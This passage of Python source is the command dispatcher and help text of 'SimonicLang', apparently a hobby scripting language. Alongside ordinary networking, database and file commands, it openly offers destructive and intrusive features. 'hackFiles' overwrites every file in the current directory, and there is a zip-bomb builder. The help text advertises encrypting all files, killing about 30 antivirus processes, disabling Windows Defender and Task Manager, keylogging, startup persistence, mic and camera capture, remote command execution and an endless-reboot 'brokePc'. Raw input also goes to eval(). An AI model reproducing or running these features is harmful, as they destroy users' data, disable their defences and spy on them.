        elif m == "smai.get":
            varname = o[0]
            joiner = o[1]
            adds = o[2]
            if adds == "0":
                adds = False
            else:
                adds = True
            length = int(o[3])
            varname2 = o[4]
            with lock:
                vars[varname2] = vars[varname].get(
                    length, joiner=joiner, adds=adds)
        elif m == "smai.save":
            varname = o[0]
            file = o[1]
            vars[varname].save(file)
        elif m == "smai.load":
            varname = o[0]
            file = o[1]
            vars[varname].load(file)
        elif m == "smai.goodquiz":
            varname = o[0]
            varname2 = o[1]
            with lock:
                vars[varname2] = vars[varname].goodquiz()
        elif m == "simac":
            varname = o[0]
            id = o[1]
            base = o[2]
            with lock:
                vars[varname] = Simacleus(id, base)
        elif m == "simac.write":
            varname = o[0]
            file = o[1]
            c = ";".join(o[2:])
            vars[varname].write(file, c)
        elif m == "simac.read":
            varname = o[0]
            file = o[1]
            varname2 = o[2]
            with lock:
                vars[varname2] = vars[varname].read(file)
        elif m == "simac.mkdir":
            varname = o[0]
            dir = o[1]
            vars[varname].mkdir(dir)
        elif m == "simac.rmdir":
            varname = o[0]
            dir = o[1]
            vars[varname].rmdir(dir)
        elif m == "simac.ls":
            varname = o[0]
            varname2 = o[1]
            with lock:
                vars[varname2] = vars[varname].listdir()
        elif m == "simac.run":
            varname = o[0]
            with lock:
                vars[varname].run()
        elif m == "simac.stop":
            varname = o[0]
            with lock:
                vars[varname].stop()
        elif m == "nebu.portscan":
            host = o[0]
            port = int(o[1])
            varname = o[2]
            r = Nebuleus().portscan(host, port)
            if r:
                r = 1
            else:
                r = 0
            with lock:
                vars[varname] = str(r)
        elif m == "nebu.findserver":
            port = o[0]
            varname = o[1]
            with lock:
                vars[varname] = Nebuleus().findserver(int(port))
        elif m == "nebu.findproxy":
            port = o[0]
            varname = o[1]
            with lock:
                vars[varname] = Nebuleus().findproxy(int(port))
        elif m == "nebu.findurls":
            url = o[0]
            varname = o[1]
            with lock:
                vars[varname] = Nebuleus().findurls(url)
        elif m == "nebu.findtextobj":
            url = o[0]
            obj = o[1]
            varname = o[2]
            with lock:
                vars[varname] = Nebuleus().findtextobj(obj, url)
        elif m == "nebu.findintobj":
            url = o[0]
            obj = o[1]
            varname = o[2]
            with lock:
                vars[varname] = Nebuleus().findintobj(obj, url)
        elif m == "nebu.findhtmlobj":
            url = o[0]
            obj = o[1]
            varname = o[2]
            with lock:
                vars[varname] = Nebuleus().findhtmlobj(obj, url)
        elif m == "nebu.send":
            typee = o[0]
            host = o[1]
            port = int(o[2])
            pack = ";".join(o[3:])
            Nebuleus().send(typee, host, port, pack)
        elif m == "nebu.sendssl":
            typee = o[0]
            host = o[1]
            port = int(o[2])
            pack = ";".join(o[3:])
            Nebuleus().sendssl(typee, host, port, pack)
        elif m == "nebu.send_withrecv":
            typee = o[0]
            host = o[1]
            port = int(o[2])
            varname = o[3]
            pack = ";".join(o[4:])
            with lock:
                vars[varname] = Nebuleus().send_withrecv(
                    typee, host, port, pack)
        elif m == "nebu.sendssl_withrecv":
            typee = o[0]
            host = o[1]
            port = int(o[2])
            varname = o[3]
            pack = ";".join(o[4:])
            with lock:
                vars[varname] = Nebuleus().sendssl_withrecv(
                    typee, host, port, pack)
        elif m == "sc":
            varname = o[0]
            with lock:
                vars[varname] = ServerSocket(o[1], o[2], o[3])
        elif m == "sc.accept":
            varname = o[0]
            idd = o[1]
            vars[varname].accept(idd)
        elif m == "sc.get_data":
            varname = o[0]
            idd = o[1]
            varname2 = o[2]
            with lock:
                vars[varname2] = vars[varname].get_data(idd)
        elif m == "sc.get_host":
            varname = o[0]
            idd = o[1]
            varname2 = o[2]
            with lock:
                vars[varname2] = vars[varname].get_host(idd)
        elif m == "sc.get_port":
            varname = o[0]
            idd = o[1]
            varname2 = o[2]
            with lock:
                vars[varname2] = vars[varname].get_port(idd)
        elif m == "sc.send":
            varname = o[0]
            idd = o[1]
            pack = ";".join(o[2:])
            vars[varname].send(idd, pack)
        elif m == "sc.close":
            varname = o[0]
            idd = o[1]
            vars[varname].close(idd)
        elif m == "sc.clear":
            varname = o[0]
            idd = o[1]
            vars[varname].clear(idd)
        elif m == "sc.stop":
            vars[varname].stop()
        elif m == "firo.allpaths":
            with lock:
                vars[o[1]] = Firoleus(o[0]).getpaths()
        elif m == "firo.search":
            with lock:
                vars[o[1]] = Firoleus(o[0]).search(";".join(o[2:]))
        elif m == "firo.searchext":
            with lock:
                vars[o[1]] = Firoleus(o[0]).searchext(";".join(o[2:]))
        elif m == "openai":
            varname = o[0]
            key = o[1]
            with lock:
                vars[varname] = OpenAI(key)
        elif m == "openai.set":
            varname = o[0]
            engine = o[1]
            vars[varname].setEngine(engine)
        elif m == "openai.talk":
            varname = o[0]
            varname2 = o[1]
            size = int(o[2])
            text = ";".join(o[3:])
            with lock:
                vars[varname2] = vars[varname].talk(text, size)
        elif m == "smdb":
            with lock:
                vars[o[0]] = SimonicDB()
        elif m == "smdb.set":
            varname = o[0]
            name = o[1]
            oneway = o[2]
            if oneway == "1":
                oneway = True
            else:
                oneway = False
            onewayl = int(o[3])
            text = ";".join(o[4:])
            vars[varname].add_data(
                name, text, oneway=oneway, oneway_length=onewayl)
        elif m == "smdb.set_with_encrypt":
            varname = o[0]
            name = o[1]
            oneway = o[2]
            if oneway == "1":
                oneway = True
            else:
                oneway = False
            onewayl = int(o[3])
            pawd = o[4]
            text = ";".join(o[5:])
            vars[varname].add_data(
                name, text, oneway=oneway, oneway_length=onewayl, encrypt=True, encrypt_pawd=pawd)
        elif m == "smdb.get":
            varname = o[0]
            name = o[1]
            varname2 = o[2]
            with lock:
                vars[varname2] = vars[varname].get(name)
        elif m == "smdb.get_with_decrypt":
            varname = o[0]
            name = o[1]
            pawd = o[2]
            varname2 = o[3]
            with lock:
                vars[varname2] = vars[varname].get(
                    name, decrypt=True, decrypt_pawd=pawd)
        elif m == "smdb.del":
            varname = o[0]
            name = o[1]
            vars[varname].del_data(name)
        elif m == "smdb.save":
            varname = o[0]
            file = o[1]
            vars[varname].save(file)
        elif m == "smdb.load":
            varname = o[0]
            file = o[1]
            vars[varname].load(file)
        elif m == "smbrow":
            varname = o[0]
            with lock:
                vars[varname] = SimonicBrowser()
        elif m == "smbrow.setApp":
            varname = o[0]
            vars[varname].setApp(o[1], o[2])
        elif m == "smbrow.setAgent":
            varname = o[0]
            vars[varname].setUA(o[1])
        elif m == "smbrow.setupAgent":
            varname = o[0]
            vars[varname].setupUA()
        elif m == "smbrow.getAgent":
            varname = o[0]
            varname2 = o[1]
            with lock:
                vars[varname2] = vars[varname].getUA()
        elif m == "smbrow.makeUser":
            varname = o[0]
            name = o[1]
            vars[varname].makeUser(name)
        elif m == "smbrow.resetHistory":
            varname = o[0]
            name = o[1]
            vars[varname].resetHistory(name)
        elif m == "smbrow.resetCookies":
            varname = o[0]
            name = o[1]
            vars[varname].resetCookies(name)
        elif m == "smbrow.setCookie":
            varname = o[0]
            name = o[1]
            target = o[2]
            cookie = ";".join(o[3:])
            vars[varname].setCookie(name, target, cookie)
        elif m == "smbrow.getCookie":
            varname = o[0]
            name = o[1]
            target = o[2]
            varname2 = o[3]
            with lock:
                vars[varname2] = vars[varname].getCookie(name, target)
        elif m == "smbrow.getHistory":
            varname = o[0]
            name = o[1]
            varname2 = o[2]
            with lock:
                vars[varname2] = vars[varname].getHistory(name)
        elif m == "smbrow.save":
            varname = o[0]
            file = o[1]
            vars[varname].save(file)
        elif m == "smbrow.load":
            varname = o[0]
            file = o[1]
            vars[varname].load(file)
        elif m == "smbrow.open":
            varname = o[0]
            user = o[1]
            varname2 = o[2]
            url = ";".join(o[3:])
            with lock:
                vars[varname2] = vars[varname].open(user, url)
        elif m == "smbrow.download":
            varname = o[0]
            user = o[1]
            file = o[2]
            output = o[3]
            if output == "1":
                output = True
            else:
                output = False
            url = ";".join(o[4:])
            vars[varname].download(user, url, file, output=output)
        elif m == "smbrow.send":
            varname = o[0]
            user = o[1]
            typee = o[2]
            data = eval(o[3])
            varname2 = o[4]
            url = ";".join(o[5:])
            with lock:
                vars[varname2] = vars[varname].send(user, typee, data, url)
        elif m == "smbrow.search":
            varname = o[0]
            user = o[1]
            varname2 = o[2]
            query = o[3]
            count = int(o[4])
            with lock:
                vars[varname2] = vars[varname].search(user, query, count)
        elif m == "smbrow.restoreLocs":
            varname = o[0]
            varname1 = o[1]
            url = o[2]
            varname2 = o[3]
            with lock:
                vars[varname2] = vars[varname].restoreLocs(url, vars[varname1])
        elif m == "clipboard.copy":
            clipboard_copy(ot)
        elif m == "clipboard.paste":
            clipboard_paste(o[0])
        elif m == "smradio.set":
            channel = o[0]
            data = ";".join(o[1:])
            SimonicRadio().sendSignal(channel, data)
        elif m == "smradio.get":
            channel = o[0]
            varname = o[1]
            with lock:
                vars[varname] = SimonicRadio().sendSignal(channel, "")
        elif m == "genar":
            with lock:
                vars[o[0]] = Genarleus()
        elif m == "genar.set":
            varname = o[0]
            name = o[1]
            listt = eval(o[2])
            vars[varname].set(name, listt)
        elif m == "genar.remove":
            varname = o[0]
            name = o[1]
            vars[varname].remove(name)
        elif m == "genar.generate":
            varname = o[0]
            idd = int(o[1])
            varname2 = o[2]
            with lock:
                vars[varname2] = vars[varname].generate(idd)
        elif m == "vram.create":
            with lock:
                vars[ot] = VRam()
        elif m == "vram.set":
            varname = o[0]
            varname2 = o[1]
            data = ";".join(o[2:])
            vars[varname].set(varname2, data)
        elif m == "vram.get":
            varname = o[0]
            varname2 = o[1]
            varname3 = o[2]
            with lock:
                vars[varname3] = vars[varname].get(varname2)
        elif m == "vram.get_id":
            varname = o[0]
            varname2 = o[1]
            with lock:
                vars[varname2] = vars[varname].get_id()
        elif m == "vram.load_id":
            varname = o[0]
            idd = o[1]
            vars[varname].load_id(idd)
        elif m == "showimg":
            title = o[0]
            file = o[1]
            showimg(title, file)
        elif m == "showimg.stop":
            showimgstop()
        elif m == "keyinput":
            varname = o[0]
            threading.Thread(target=keyinput, args=(varname,)).start()
        elif m == "hackUser":
            hackUserSystem(o[0], o[1])
        elif m == "hackFiles":
            for file in os.listdir():
                with open(file, "w") as f:
                    f.write(fstring(ot))
        elif m == "radioSignal":
            duration = int(o[0])
            sr = int(o[1])
            hz = float(o[2])
            radioSignal(duration, sr, hz)
        elif m == "radioSignalBg":
            duration = int(o[0])
            sr = int(o[1])
            hz = float(o[2])
            radioSignalBg(duration, sr, hz)
        elif m == "rotateScreen":
            rotateScreen(float(ot))
        elif m == "rotateScreenRandom":
            rotateScreenRandom()
        elif m == "setup_sl":
            os.system("git clone https://github.com/aertsimon90/SimonicLang")
        elif m == "unicodeSearch":
            query = o[0]
            varname = o[1]
            with lock:
                vars[varname] = unicodeSearch(query)
        elif m == "translate":
            varname = o[0]
            lang1 = o[1]
            lang2 = o[2]
            text = ";".join(o[3:])
            with lock:
                vars[varname] = translate(text, lang1, lang2)
        elif m == "bufferOverFlow":
            threading.Thread(target=bof, args=(float(fstring(ot)),)).start()
        elif m == "novasock":
            with lock:
                vars[ot] = NovaleusSock()
        elif m == "novasock.set_default_socket":
            vars[ot].set_default_socket()
        elif m == "novasock.set_virtual_socket":
            vars[ot].set_virtual_socket()
        elif m == "novasock.bind":
            vars[o[0]].bind((o[1], int(o[2])))
        elif m == "novasock.connect":
            vars[o[0]].connect((o[1], int(o[2])))
        elif m == "novasock.settimeout":
            vars[o[0]].settimeout(float(o[1]))
        elif m == "novasock.create_ssl":
            vars[ot].create_ssl()
        elif m == "novasock.remove_ssl":
            vars[ot].remove_ssl()
        elif m == "novasock.sendall":
            vars[o[0]].sendall(";".join(o[1:]))
        elif m == "novasock.recv":
            p = vars[o[0]].recv()
            with lock:
                vars[o[1]] = p
        elif m == "novasock.close":
            vars[ot].close()
        elif m == "httpSend":
            target = fstring(o[0])
            port = int(fstring(o[1]))
            met = fstring(o[2])
            op = fstring(o[3])
            pack = f"{met} {op} HTTP/1.1\r\nHost: {target}:{port}\r\n"
            for header, value in httpHeaders.items():
                pack += f"{header}: {value}\r\n"
            pack += "\r\n"
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.8)
                s.connect((target, port))
                s.sendall(pack.encode())
            except:
                pass
            s.close()
        elif m == "httpSendR":
            target = fstring(o[0])
            port = int(fstring(o[1]))
            met = fstring(o[2])
            op = fstring(o[3])
            varname = fstring(o[4])
            pack = f"{met} {op} HTTP/1.1\r\nHost: {target}:{port}\r\n"
            for header, value in httpHeaders.items():
                pack += f"{header}: {value}\r\n"
            pack += "\r\n"
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.8)
                s.connect((target, port))
                s.sendall(pack.encode())
                r = ""
                while True:
                    try:
                        rr = s.recv(65535).decode()
                        r += rr
                    except:
                        break
            except:
                r = ""
            s.close()
            with lock:
                vars[varname] = str(r)
        elif m == "HttpServer":
            host = o[0]
            port = int(o[1])
            apikey = o[2]
            s = HttpServer(host, port, apikey)
            with lock:
                vars[o[3]] = s
        elif m == "HttpServer.SetFile":
            varname = o[0]
            path = o[1]
            c = o[2]
            vars[varname].SetFile(path, c)
        elif m == "HttpServer.GetFile":
            varname = o[0]
            path = o[1]
            varname2 = o[2]
            with lock:
                vars[varname2] = vars[varname].GetFile(path)
        elif m == "HttpServer.DelFile":
            varname = o[0]
            varname2 = o[1]
            vars[varname].DelFile(varname2)
        elif m == "HttpServer.Run":
            varname = o[0]
            logfile = o[1]
            vars[varname].Run(logfile)
        elif m == "HttpsServer":
            host = o[0]
            port = int(o[1])
            apikey = o[2]
            s = HttpsServer(host, port, apikey)
            with lock:
                vars[o[3]] = s
        elif m == "HttpsServer.SetFile":
            varname = o[0]
            path = o[1]
            c = o[2]
            vars[varname].SetFile(path, c)
        elif m == "HttpsServer.GetFile":
            varname = o[0]
            path = o[1]
            varname2 = o[2]
            with lock:
                vars[varname2] = vars[varname].GetFile(path)
        elif m == "HttpsServer.DelFile":
            varname = o[0]
            varname2 = o[1]
            vars[varname].DelFile(varname2)
        elif m == "HttpsServer.Run":
            varname = o[0]
            logfile = o[1]
            vars[varname].Run(logfile)
        elif m == "SimonicNet.Create":
            ip = o[0]
            pawd = o[1]
            s = SimonicNet()
            recv = s.Create(ip, pawd)
            recv = "\r\n\r\n".join(recv.split("\r\n\r\n")[1:])
            if "Error" in recv:
                print(recv)
        elif m == "SimonicNet.SetFile":
            ip = o[0]
            pawd = o[1]
            file = o[2]
            c = ";".join(o[3:]).replace("\n", "/n/*")
            s = SimonicNet()
            recv = s.SetFile(ip, pawd, file, c)
            recv = "\r\n\r\n".join(recv.split("\r\n\r\n")[1:])
            if "Error" in recv:
                print(recv)
        elif m == "SimonicNet.GetFile":
            ip = o[0]
            pawd = o[1]
            file = o[2]
            varname = o[3]
            s = SimonicNet()
            recv = s.GetFile(ip, pawd, file)
            recv = "\r\n\r\n".join(recv.split("\r\n\r\n")[
                                   1:]).replace("/n/*", "\n")
            with lock:
                vars[varname] = recv
        elif m == "SimonicNet.SetOpenFile":
            ip = o[0]
            pawd = o[1]
            file = o[2]
            c = ";".join(o[3:]).replace("\n", "/n/*")
            s = SimonicNet()
            recv = s.SetOpenFile(ip, pawd, file, c)
            recv = "\r\n\r\n".join(recv.split("\r\n\r\n")[1:])
            if "Error" in recv:
                print(recv)
        elif m == "SimonicNet.GetOpenFile":
            ip = o[0]
            file = o[1]
            varname = o[2]
            s = SimonicNet()
            recv = s.GetOpenFile(ip, file)
            recv = "\r\n\r\n".join(recv.split("\r\n\r\n")[
                                   1:]).replace("/n/*", "\n")
            with lock:
                vars[varname] = recv
        elif m == "SimonicNet.Open":
            ip = o[0]
            varname = o[1]
            s = SimonicNet()
            recv = s.Open(ip)
            recv = "\r\n\r\n".join(recv.split("\r\n\r\n")[
                                   1:]).replace("/n/*", "\n")
            with lock:
                vars[varname] = recv
        elif m == "SimonicNet.WebOpen":
            s = SimonicNet()
            s.WebOpen(ot)
        elif m == "SimonicNet.GetAll":
            ip = o[0]
            pawd = o[1]
            varname = o[2]
            s = SimonicNet()
            recv = s.GetAll(ip, pawd)
            recv = "\r\n\r\n".join(recv.split("\r\n\r\n")[1:])
            with lock:
                vars[varname] = recv
        elif m == "SimonicNet.Search":
            query = o[0]
            num = o[1]
            varname = o[2]
            s = SimonicNet()
            recv = s.Search(query, num)
            recv = "\r\n\r\n".join(recv.split("\r\n\r\n")[
                                   1:]).replace("/n/*", "\n")
            with lock:
                vars[varname] = recv
        elif m == "ipapiGet":
            ip = o[0]
            name = o[1]
            varname = o[2]
            with lock:
                vars[varname] = ipapiGet(ip, name)
        elif m == "getPing":
            target = o[0]
            varname = o[1]
            with lock:
                vars[varname] = getPing(target)
        elif m == "getMyPing":
            varname = o[0]
            with lock:
                vars[varname] = getMyPing()
        elif m == "proxyGet":
            url = fstring(o[0])
            varname = fstring(o[1])
            recv = proxyGet0(url)
            vars[str(varname)] = str(recv)
        elif m == "cloudGet":
            target = fstring(o[0])
            file = fstring(o[1])
            varname = fstring(o[2])
            s = SimonCloud(target)
            s.get(file)
            with lock:
                vars[str(varname)] = str(s.recv())
        elif m == "listenMic":
            duration = float(o[0])
            file = o[1]
            listenMic(duration, file)
        elif m == "cloudSet":
            target = fstring(o[0])
            file = fstring(o[1])
            c = fstring(";".join(o[2:]))
            s = SimonCloud(target)
            s.set(file, c)
            a = str(s.recv())
            if a == "error":
                if errors:
                    orint("error")
        elif m == "cloudCom":
            target = fstring(o[0])
            varname = fstring(o[1])
            command = fstring(";".join(o[2:]))
            s = SimonCloud(target)
            s.com(command)
            a = str(s.recv())
            if a == "error":
                if errors:
                    orint("error")
            else:
                with lock:
                    vars[str(varname)] = a
        elif m == "cloudStart":
            SimonCloudStart()
        elif m == "randomChc":
            varname = fstring(o[0])
            vars[str(varname)] = random.choice(o[1:])
        elif m == "clock":
            with lock:
                vars[ot] = Clock()
        elif m == "clock.run":
            vars[ot].run()
        elif m == "clock.stop":
            with lock:
                vars[o[1]] = vars[o[0]].stop()
        elif m == "httpSendRD":
            target = fstring(o[0])
            port = int(fstring(o[1]))
            met = fstring(o[2])
            op = fstring(o[3])
            varname = fstring(o[4])
            pack = f"{met} {op} HTTP/1.1\r\nHost: {target}:{port}\r\n"
            for header, value in httpHeaders.items():
                pack += f"{header}: {value}\r\n"
            pack += "\r\n"
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.8)
                s.connect((target, port))
                s.sendall(pack.encode())
                r = ""
                while True:
                    try:
                        rr = s.recv(65535).decode()
                        r += rr
                    except:
                        break
                r = r.split("\r\n\r\n")[1]
            except:
                r = ""
            s.close()
            with lock:
                vars[varname] = str(r)
        elif m == "httpHead":
            header = fstring(o[0])
            value = fstring(";".join(o[1:]))
            with lock:
                httpHeaders[header] = value
        elif m == "httpHeadR":
            header = fstring(o[0])
            with lock:
                del httpHeaders[header]
        elif m == "math":
            with lock:
                option = fstring(o[0])
                varname = fstring(o[1])
                value = str(eval(option))
                vars[varname] = str(value)
        elif m == "beep":
            beep(ot)
        elif m == "randomAPI":
            length = int(fstring(o[0]))
            varname = fstring(o[1])
            with lock:
                vars[varname] = str(secrets.token_hex(length))
        elif m == "hash":
            algorithm = o[0]
            varname = o[1]
            text = ";".join(o[2:])
            with lock:
                vars[varname] = Hash().hash(algorithm, text)
        elif m == "breakhash":
            varname = o[0]
            varname2 = o[1]
            text = ";".join(o[2:])
            with lock:
                algo, oldtext = Hash().breakHash(text)
                vars[varname] = algo
                vars[varname2] = oldtext
        elif m == "cia.get":
            country = o[0]
            varname = o[1]
            with lock:
                vars[varname] = CIA_Database().get(country.replace(" ", "-"))
        elif m == "zipbomb":
            name = o[0]
            mb = int(o[1])
            names = []
            for _ in range(mb):
                n = ""
                for _ in range(32):
                    n += random.choice(
                        "q w e r t y u i o p a s d f g h j k l z x c v b n m 1 2 3 4 5 6 7 8 9 0".split(" "))
                with open(n, "w") as f:
                    f.write("."+(" "*1024*1024))
                names.append(n)
            import zipfile
            with zipfile.ZipFile(name, "w") as f:
                for n in names:
                    f.write(n)
                    runCode("file.delete;"+n)
        elif m == "download":
            url = o[0]
            file = o[1]
            output = o[2]
            if output == "1":
                output = True
            else:
                output = False
            download(url, file, output)
        elif m == "IF":
            value1 = fstring(o[0])
            option = fstring(o[1])
            value2 = fstring(o[2])
            code = ot.split(";if=")[1]
            code = code.split(";else=")
            if option == "==":
                if value1 == value2:
                    for h in code[0].split(" && "):
                        runCode(h)
                else:
                    for h in code[1].split(" && "):
                        runCode(h)
            elif option == ">=":
                if float(value1) >= float(value2):
                    for h in code[0].split(" && "):
                        runCode(h)
                else:
                    for h in code[1].split(" && "):
                        runCode(h)
            elif option == "<=":
                if float(value1) <= float(value2):
                    for h in code[0].split(" && "):
                        runCode(h)
                else:
                    for h in code[1].split(" && "):
                        runCode(h)
            elif option == ">":
                if float(value1) > float(value2):
                    for h in code[0].split(" && "):
                        runCode(h)
                else:
                    for h in code[1].split(" && "):
                        runCode(h)
            elif option == "<":
                if float(value1) < float(value2):
                    for h in code[0].split(" && "):
                        runCode(h)
                else:
                    for h in code[1].split(" && "):
                        runCode(h)
            elif option == "in":
                if value1 in value2:
                    for h in code[0].split(" && "):
                        runCode(h)
                else:
                    for h in code[1].split(" && "):
                        runCode(h)
            else:
                for h in code[1].split(" && "):
                    runCode(h)
        elif m == "fstr":
            runCode(fstring(ot))
        elif m == "loadAllMods":
            loadAllMods()
        elif m == "busywait":
            busywait(float(ot))
        elif m == "func":
            varname = o[0]
            args = o[1].split("::")
            code = ";".join(o[2:])
            with lock:
                vars[varname] = Function(code, args)
        elif m == "func.run":
            varname = o[0]
            args = o[1].split("::")
            vars[varname].run(args)
        elif m == "func.delete":
            vars[o[0]].delete()
        elif m == "withlock":
            with lock:
                Syntax().run(ot)
        elif m == "checksl":
            SLCheck().check_all()
        elif m == "help":
            print("chechsl = Check all options and features of your SimonicLang")
            print("withlock;code... = Start SimonicLang code with threading lock")
            print("fstr;code... = Use any command with f-string")
            print("func;varname;args(e.g. arg1::arg2...);code... = Create a function")
            print(
                "func.run;varname;args(e.g. arg1::arg2...) = Run a code of the function")
            print("func.delete;varname = Delete the function")
            print("stopall = Stop all threads and exit from program")
            print("loadAllMods = load all extension mods (psutil/fake_useragent/datetime/requests/keyboard/tkinter)")
            print("log;text... = Write a text to output")
            print("logf;text... = Write a text to output with f-string")
            print("optilog;text... = Write a text to output (Optimizated)")
            print(
                "optilogf;Your number: $<v.number> = Write a text to output with f-string (Optimizated)")
            print("outNone = Disable output")
            print("outSys = Activate output")
            print("returnAuto;file.sl = SimonicLang file to Python file (f-string)")
            print(
                "returnPyToC;file.py = Python to C Code (returns to file.py.c file) (with Cython)")
            print(
                "returnPyToExe;file.py = Python to Exe program with gcc (returns file.py.exe)")
            print("returnCToExe;file.c = C code to exe program (returns file.c.exe)")
            print("returnSLToC;file.sl = SimonicLang to C Code (return file.sl.py.c) (with gcc and cython) (so slow in the sometimes)")
            print("if you want SimonicLang to exe file:")
            print("-1 open compiler and enter run: returnAuto;file.sl")
            print("-2 open cmd")
            print("-3 enter: pip install PyInstaller")
            print(
                "-4 enter: python3 -m PyInstaller -i logo.ico -n AppName --onefile file.sl")
            print("-5 if has been error=open file.spec file and enter this code to near of top: 'import sys;sys.setrecursionlimit(sys.getrecursionlimit()*5)' and enter this command: python3 -m PyInstaller file.spec")
            print("-6 remove file.spec file and build directory")
            print("-7 open dist directory and use your file.exe!")
            print("eSet;on = Activate errors")
            print("eSet;off = Disable errors")
            print("vSet;varname;value... = Creates or seting some variable")
            print(
                "vSetF;varname;value... = Creates or seting some variable (with value f-string)")
            print(
                "vSetFF;varname;value... = Creates or seting some variable (with value and name f-string)")
            print("vR;varname = Remove a variable")
            print("vRF;varname = Remove a variable (with name f-string)")
            print(
                "vList;varname;objects(obj1;obj2;...) = Creates or seting list variable")
            print(
                "vListF;varname;objects(obj1;obj2;...) = Creates or seting list variable (with f-string)")
            print("vListJoin;varname;joiner = list variable to text variable")
            print("vListSplit;varname;splitter = text variable to text variable")
            print("vReplace;varname;textto;text = Replace text from variable")
            print(
                "vSelect;varname;number;objvarname = Select object/character from variable")
            print(
                "vSelectL;varname;minnumber;maxnumber;objvarname = Select objects/characters from variable")
            print("vReverse;varname = Reverse the variable")
            print("vJson;varname = Set or create json variable")
            print(
                "vJsonSet;varname;item;type(number/text);value = Set item from json variable")
            print(
                "vJsonGet;varname;item;varname2 = Get json variable item and insert to variable 2")
            print("vJsonDel;varname;item = Delete json variable item")
            print(
                "vJsonDumps;varname;indent(1=True 0=False);varname2 = Json to text and insert to variable 2")
            print(
                "vJsonLoads;varname;varname2 = Load dumped json text to real json variable")
            print("vAddToNewLine;varname;text = Moves to a new line in the string object and writes the text to be added")
            print("input;varname;text... = Input system")
            print("inputf;varname;text... = Input system (with f-string)")
            print("serverCalculate;ports;trueLevel;varname = Calculate how much servers in the world (e.g. serverCalculate;80,443;10;example)")
            print("%in;num1;num2;varname = Calculate the percentage of the first number to the second number (example num1=1000 num2=15 result=6666.6...) (f-string)")
            print("%out;num1;num2;varname = calculate the percentage of a number in the 2nd number (example num1=1000 num2=15 result=150) (with f-string)")
            print("random;min;max;varname = Generates random number")
            print("randomf;min;max;varname = Generates random number (with f-string)")
            print("randoms;min;max;varname = Generates random uniform number")
            print(
                "randomsf;min;max;varname = Generates random uniform number (with f-string)")
            print("rwLock = Encrypt all files")
            print("rwUnlock = Decrypt all files")
            print(
                "sqlConn;file;varname = Start a sqlite3 connection and save cursor to variable. (f-string)")
            print("sqlExec;varname;code... = Execute SQL Code with cursor (f-string)")
            print(
                "sqlClose;varname = Close sqlite3 connection and delete variable (f-string)")
            print(
                "setRoot;filename... = Gives root permissions to file (with f-string) (0o777)")
            print(
                "blockPerms;filename... = Block the permissions of file (with f-string) (0)")
            print(
                "task.list_pid=name;varname = List of the tasks and save to json variable (e.g. {pid: name})")
            print(
                "task.list_pid=status;varname = List of the tasks and save to json variable (e.g. {pid: status})")
            print(
                "task.list_pid=ram;varname = List of the tasks and save to json variable (e.g. {pid: ramUsage})")
            print(
                "task.list_pid=cpu;varname = List of the tasks and save to json variable (e.g. {pid: cpuUsage})")
            print(
                "task.list_name=pid;varname = List of the tasks and save to json variable (e.g. {name: pid})")
            print("task.pid;varname;name = Get pid of the task name")
            print("task.name;varname;pid = Get task name of the pid")
            print("task.status;varname;pid = Get status(sleeping/running) of the pid")
            print("task.cpu;varname;pid = Get cpu usage of the pid")
            print("task.ram;varname;pid = Get ram/memory usage of the pid")
            print("task.mypid;varname = Get main task pid (SimonicLang Task PID)")
            print("task.kill;name_or_pid = Kill the process")
            print("task.block;name_or_pid = Block the process")
            print("moveMouse;x_add;y_add;duration = Move the mouse")
            print("moveMouseTo;x_pos;y_pos;duration = Mote the mouse to location")
            print("mouseClickRight = Click with mouse on screen (Right click)")
            print("mouseClickLeft = Click with mouse on screen (Left click)")
            print("mousePos;xVarname;yVarname = Get the mouse position")
            print("keyboardWrite;text = Write with user's keyboard")
            print("keyboardPress;text/button = Press the button with user's keyboard")
            print("shakeMouse;power;duration = Move the mouse to random location")
            print("disableMouse = Disable the mouse")
            print("disableKeyboard = Disable the keyboard")
            print("disableTaskManager = Disable the task manager")
            print("blockWindowsDefender = Disable the windows defender")
            print("blockBrowsers = Disable the user's browsers with task.block (10 Browsers: Opera/Brave/Chrome/Edge/Firefox/Safari/Chromium/Vivaldi/DuckDuckGO/I Explore)")
            print("blockAntiviruses = Disable the 30 top antivirus tasks with task.block (Avast/AVG/Bitdefender/Kaspersky/McAfee/Norton/Avira/TrendMicro/ESET/Malwarebytes/WindowsDefender/Sophos/Panda/F-Secure/BullGuard/Webroot/GData/VIPRE/Comodo/Symantec/360/AvastUI/AVGUI/BitdefenderUI/KasperskyUI/McAfeeUI/NortonUI/AviraUI/TrendMicroUI/ESETUI/MalwarebytesUI/WindowsDefenderUI/SophosUI/PandaUI/F-SecureUI/BullGuardUI/WebrootUI/GDataUI/VIPREUI/ComodoUI/SymantecUI/360UI)")
            print("winUserAdd;username;password = Windows user adding (with f-string)")
            print("winUserRemove;username = Windows user removing (with f-string)")
            print(
                "notify;app_name;title;message;duration = Create a notification (for Android/Linux/Windows)")
            print("screenshot;filename = Take a screenshot and save to file")
            print(
                "capture;filename;width;height = Take a video capture photo from first camera and save to file")
            print("unicodeText;varname;min_ord;max_ord = List the unicode characters")
            print(
                "unicodeRandomText;varname;min_ord;max_ord;length = Create text variable have random characters")
            print("beep;name(info/warn/error/quest) = Play a windows beep sound")
            print("shutdown = Shutdown PC for Windows/Linux/Shell")
            print("reboot = Reboot/Restart PC For Windows/Linux/Shell")
            print("logout = Logout from PC User For Windows/Linux/Shell")
            print("brokePc = It tries to shut down and restart and logout the computer infinite of times, which completely destroys the computer and may not be usable at all (Extremely Dangerous)")
            print(
                "startupAdd;command = Add cmd command to PC's startup system (For Windows)")
            print("wait;seconds... = Wait a seconds (time sleep)")
            print("busywait;seconds... = Busy waiting a seconds (busy time sleep)")
            print("keylog;varname = Key logging and saves to variable")
            print("keyinput;varname = Keyboard inputing")
            print("ipapiGet;ipaddr;name(network/version/city/region/region_code/country/country_code/country_code_iso3/country_name/country_capital/country_tld/continent_code/postal/latitude/longitude/timezone/ufc_offset/country_calling_code/currency/currency_name/languages/country_area/country_popolation/asn/org);varname = Get ip api info and save to variable")
            print(
                "openLocation;ipaddr = Open ip address location with google maps on web browser")
            print("getPing;target;varname = Get ping ms")
            print("getMyPing;varname = Get User's ping ms")
            print("encrypt;filename;password = Encrypt file with SimonicLang Crypto")
            print("decrypt;filename;password = Decrypt file with SimonicLang Crypto")
            print("rpcFile;ipaddr;filepath = Send file with rpc")
            print("rpcCom;ipaddr;command... = Send cmd command with rpc")
